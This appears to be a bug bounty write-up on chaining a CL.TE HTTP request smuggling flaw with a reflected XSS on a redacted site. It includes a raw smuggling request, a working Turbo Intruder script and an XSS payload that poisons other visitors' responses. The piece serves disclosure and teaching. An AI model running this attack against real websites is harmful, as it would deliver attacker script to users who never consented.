_This vulnerability was found on a private programme, therefore parts have been redacted._

As with the majority of HTTP Smuggling, it started with a smuggle probe from Burp’s [HTTP Request Smuggler Extension](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646):

Unfortunately there was nothing interesting on the back-end to attempt to bypass the front-end security controls, or no sensitive information being passed from users to attempt to capture their requests. However, earlier a common reflected XSS was found:

Which in the source code looked like: ![img](https://i.imgur.com/h6XMxRp.png)

Which made me think, could we force other users to search for the reflected XSS, escalating it to site-wide, no user interaction XSS?

I crafted the following request to test the identified `CL.TE` vulnerability:
  
  
  POST /redacted.aspx HTTP/1.1
  Transfer-Encoding: chunked
  Host: redacted.com
  Content-Length: 21
  X-Blah-Ignore: chunked
  
  0
  
  GET /404
  Foo: x
  

This request works by taking advantage of discrepancies in HTTP specifications, which provides two different methods for specifying the length of HTTP messages:

  * The front-end server processes the `Content-Length:` header, which forwards the whole request.
  * The back-end uses `Transfer-Encoding: chunked` processing only the first chunk, which is set at 0 length, which in chunked encoding will terminate the request.
  * The remaining bytes `GET /404` are left unprocessed, which the back-end will process these bytes as the start of the next request. `GET /404` was chosen as it returns a `404`, making it easier to identify if the vulnerability exists.
  * When sending the request twice, a `404` is returned for the second request, showing the `GET /404` has successfully been processed within the next request.

This led onto launching a `CL.TE` smuggle attack with the following **Turbo Intruder** payload, including the XSS vulnerability:
  
  
  def queueRequests(target, wordlists):
  
  engine = RequestEngine(endpoint=target.endpoint,
  concurrentConnections=5,
  requestsPerConnection=1,
  resumeSSL=False,
  timeout=10,
  pipeline=False,
  maxRetriesPerRequest=0,
  engine=Engine.THREADED,
  )
  
  prefix = '''GET /redacted.aspx?redacted=1"*%2Fconfirm%0B(1)<%2FScript%2F--><Script>%2F* HTTP/1.1
  X-Ignore: X'''
  
  attack = target.req + prefix
  engine.queue(attack)
  
  victim = target.req
  for i in range(7):
  engine.queue(victim)
  time.sleep(0.05)
  
  
  def handleResponse(req, interesting):
  table.add(req)
  

and sure enough, the request was successfully smuggled, and one of the next requests received the poisoned XSS response:

> _XSS being smuggled_ ![img](https://i.imgur.com/StC9vG6.png)
> 
> ![img](https://i.imgur.com/ebCcdDJ.png)

> _Later response poisoned with XSS_ ![img](https://i.imgur.com/WlPViEN.png)
> 
> ![img](https://i.imgur.com/vjgQP0m.png)

Although this programme accepted reflected XSS as is, this same approach could have been used to chain together XSS with CSRF or a CORS misconfiguration. If the attack kept being fired, nearly every user who visited the site would receive a poisoned response.
